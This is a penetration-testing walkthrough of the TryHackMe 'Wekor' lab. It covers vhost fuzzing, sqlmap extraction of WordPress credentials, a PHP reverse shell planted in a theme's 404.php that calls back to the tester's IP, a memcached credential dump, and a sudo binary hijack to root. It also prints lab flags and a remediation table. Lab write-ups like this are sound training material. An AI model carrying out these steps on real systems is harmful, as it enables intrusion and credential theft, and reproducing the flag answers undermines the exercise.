# TryHackMe: Wekor — Penetration Testing Walkthrough

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme&logoColor=white)
![OS](https://img.shields.io/badge/OS-Linux%20(Ubuntu)-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Category](https://img.shields.io/badge/Type-Adversary%20Simulation-blueviolet?style=for-the-badge)

---

## Executive Summary

This is a full penetration testing walkthrough of the **Wekor** room on TryHackMe. The engagement covers the complete attack chain from initial reconnaissance to root compromise.

| Metric | Details |
|---|---|
| **Target** | Wekor (TryHackMe) |
| **OS** | Ubuntu Linux 16.04 |
| **Initial Foothold** | SQL Injection → WordPress RCE |
| **Lateral Movement** | Memcached credential dump |
| **Privilege Escalation** | Sudo binary hijacking |
| **Impact** | Full root compromise |

---

## Attack Chain

```
RECON → SQLi → WP RCE → MEMCACHED DUMP → SUDO HIJACK → ROOT
```

---

## Table of Contents

1. [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
2. [Phase 2 — SQL Injection](#phase-2--sql-injection)
3. [Phase 3 — Initial Foothold (RCE)](#phase-3--initial-foothold-rce)
4. [Phase 4 — Lateral Movement](#phase-4--lateral-movement)
5. [Phase 5 — Privilege Escalation](#phase-5--privilege-escalation)
6. [Flags](#flags)
7. [Remediation](#remediation)

---

## Phase 1 — Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -A -p- <TARGET_IP> -oN nmap_scan.txt
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18
```

### robots.txt

Visiting `http://<TARGET_IP>/robots.txt` revealed several disallowed paths including `/comingreallysoon` and `/interesting`. Navigating to `/comingreallysoon` pointed to the e-commerce shop at `/it-next/`.

### Virtual Host Fuzzing

```bash
# Get baseline response size
curl -s -H "Host: fake.wekor.thm" http://<TARGET_IP> | wc -c

# Fuzz for subdomains (replace 23 with your baseline size)
ffuf -u http://<TARGET_IP>/ -H "Host: FUZZ.wekor.thm" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 23
```

**Found:** `site.wekor.thm`

### Update /etc/hosts

```bash
echo "<TARGET_IP>  wekor.thm site.wekor.thm" | sudo tee -a /etc/hosts
```

Visiting `http://site.wekor.thm/wordpress/` revealed an active WordPress instance.

---

## Phase 2 — SQL Injection

### Discovery

The shopping cart coupon field at `http://wekor.thm/it-next/` was vulnerable to SQL injection.

### Exploitation with sqlmap

Intercept the coupon POST request with Burp Suite and save as `req.txt`, then:

```bash
# Step 1: Enumerate databases
sqlmap -r req.txt --dbs --batch

# Step 2: Enumerate tables in wordpress DB
sqlmap -r req.txt -D wordpress --tables --batch

# Step 3: Dump wp_users table
sqlmap -r req.txt -D wordpress -T wp_users --dump --batch
```

**Cracked credentials:**
```
wp_yura : soccer13
```

---

## Phase 3 — Initial Foothold (RCE)

### WordPress Login

Login at `http://site.wekor.thm/wordpress/wp-login.php` with `wp_yura:soccer13`.

### PHP Reverse Shell

1. Go to **Appearance → Theme Editor → 404.php**
2. Replace content with [pentestmonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
3. Set your tun0 IP and port:
```php
$ip = '<YOUR_TUN0_IP>';
$port = 4444;
```
4. Click **Update File**

### Catch the Shell

```bash
# Terminal 1 - Start listener
nc -lvnp 4444

# Trigger in browser
http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php
```

### Upgrade Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Phase 4 — Lateral Movement

### Internal Service Enumeration

```bash
ss -tlnp
```

Found Memcached running on `127.0.0.1:11211`.

### Dump Memcached Credentials

```bash
telnet 127.0.0.1 11211
get username
get password
quit
```

**Credentials found:**
```
Username: Orka
Password: OrkAiSC00L24/7$
```

### Switch User

```bash
su Orka
# Enter: OrkAiSC00L24/7$
cat /home/Orka/user.txt
```

---

## Phase 5 — Privilege Escalation

### Sudo Rights Enumeration

```bash
sudo -l
```

Output:
```
User Orka may run the following commands on osboxes:
    (ALL : ALL) NOPASSWD: /home/Orka/Desktop/bitcoin
```

### Binary Hijacking

The `Desktop` directory is writable by Orka, allowing us to replace the bitcoin binary:

```bash
# Rename original directory
mv /home/Orka/Desktop /home/Orka/Desktop.bak

# Create new Desktop directory
mkdir /home/Orka/Desktop

# Copy bash as bitcoin
cp /bin/bash /home/Orka/Desktop/bitcoin
chmod +x /home/Orka/Desktop/bitcoin

# Execute as root
echo 'OrkAiSC00L24/7$' | sudo -S /home/Orka/Desktop/bitcoin -pc 'cat /root/root.txt'
```

---

## Flags

| Flag | Value |
|---|---|
| **User** | `1a26a6d51c0172400add0e297608dec6` |
| **Root** | `f4e788f87cc3afaecbaf0f0fe9ae6ad7` |

---

## Remediation

| Vulnerability | Severity | Fix |
|---|---|---|
| SQL Injection | 🔴 Critical | Use parameterized queries / prepared statements |
| WordPress File Editing | 🟠 High | Add `define('DISALLOW_FILE_EDIT', true)` to wp-config.php |
| Unauthenticated Memcached | 🟠 High | Never store plaintext credentials in cache; enable SASL auth |
| Insecure Sudo Privileges | 🔴 Critical | Never grant sudo on binaries in user-writable directories |

---

## Tools Used

- `nmap` — Port and service enumeration
- `ffuf` — Virtual host fuzzing
- `Burp Suite` — HTTP request interception
- `sqlmap` — Automated SQL injection
- `netcat` — Reverse shell listener
- `telnet` — Memcached interaction

---

## Disclaimer

This walkthrough is strictly for educational purposes and authorized penetration testing practice on TryHackMe labs. Never perform these techniques on systems without explicit written permission.
